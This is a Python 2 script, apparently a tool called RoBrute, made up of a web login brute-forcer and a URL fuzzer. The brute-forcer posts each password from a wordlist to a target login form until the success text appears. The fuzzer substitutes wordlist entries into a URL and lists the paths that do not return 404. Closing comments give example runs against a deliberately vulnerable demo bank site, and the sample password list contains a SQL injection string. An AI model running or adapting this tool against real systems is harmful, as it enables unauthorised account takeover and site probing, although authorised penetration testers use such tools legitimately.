import time, requests, sys, time, urllib
from datetime import timedelta
import RoBruteLogo

fuzz = False
if len(sys.argv)-1 == 4:
	fuzz = True

if "help" in sys.argv or "-n" in sys.argv:
	print "\nFuzzer:"
	print "Check README.md for syntax\n"
	print "Brute Force:"
	print "Set arg to 'brute' to see syntax"
	sys.exit()

def brute():
	time.sleep(2)
	try:
		url = str(sys.argv[1])
		uid = str(sys.argv[2])
		pid = str(sys.argv[3])
		lkf = str(sys.argv[4])
		usr = str(sys.argv[5])
		pwd = str(sys.argv[6])
	except:
		print "\t\t\t  Arguments:\n\t\t\t\t <url>\n\t\t  <user_textbox_id>\n\t\t  <pass_textbox_id>\n\t <words_on_successful_page>\n\t <username> <password_file>\n"
		time.sleep(1)
		print "              SavSec\n"
		time.sleep(1)
		print "          Your Arguments\n"
		time.sleep(1)
		try:
			test = url
		except:
			url = "[missing]"
			pass
		try:
			test = uid
		except:
			uid = "[missig]"
			pass
		try:
			test = pid
		except:
			pid = "[missing]"
			pass
		try:
			test = lkf
		except:
			lkf = "[missing]"
			pass
		try:
			test = usr
		except:
			usr = "[missing]"
			pass
		try:
			test = pwd
		except:
			pwd = "[missing]"
			pass
		print "URL: %s" % url
		print "USER ID: %s" % uid
		print "PASS ID: %s" % pid
		print "SEARCH: %s" % lkf
		print "USER: %s" % usr
		print "FILE: %s" % pwd
		sys.exit()
	if "http" not in url:
		url = "http://" + url
	start_time = time.time()
	f = open(pwd,"r")
	num = sum(1 for line in open(pwd))
	print "       Passwords Loaded:", num
	print " "
	a = 0
	for i in range(num):
		pwd = f.readline().replace("\n","")
		values = {uid : usr, pid : pwd}
		r = requests.post(url, data=values)
		info = r.content.find(lkf)
		a = a + 1
		sys.stdout.write("\r         Trying %s of %s" %(a,num))
		sys.stdout.flush()
		if info > 2:
			sys.stdout.write("\r            " + pwd + "         \n")
			elapsed_time = time.time() - start_time
			print ""
			time.sleep(3)
			times = str(timedelta(seconds=elapsed_time))
			print "   Time Elapsed:", str(times)
			sys.exit()

def fuzzer():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument("-f", "--fuzz",help="Fuzz Site & Select Fuzz File")
	parser.add_argument("-u", "--url",help="Target Url (* for target)")
	parser.add_argument("-n", "--nohelp",help="Hides help",action="store_true")
	args = parser.parse_args()
	if not args.nohelp:
		parser.print_help()
		print ""
	file = args.fuzz
	url = args.url
	if "http" not in url:
		url = "http://" + url
	print "      -=- Fuzzing Website -=-"
	if "*" not in url:
		print "'*' Symbol Needed To Target Fuzz Location!"
		sys.exit()
	start_time = time.time()
	url = url.replace("*","{0}")
	f = open(file).readlines()
	print "        Options Loaded:", len(f)
	print ""
	for _ in f:
		t = url.format(_)
		n = urllib.urlopen(t).code
		if n != 404:
			print t
	elapsed_time = time.time() - start_time
	times = str(timedelta(seconds=elapsed_time))
	print "   Time Elapsed:", str(times)

if fuzz:
	fuzzer()
else:
	brute()

# Pre-Set Arguments (Legal Testing)
"""
http://demo.testfire.net/bank/login.aspx uid passw Welcome admin passes.txt
"""
# passes.txt:
"""
1
2
3
4
5
6
7
8
9
'or 1=1 -- 
10
11
12
13
14
"""

# Fuzzer Example:
"""
-u http://demo.testfire.net/* -f fuzz.data
"""
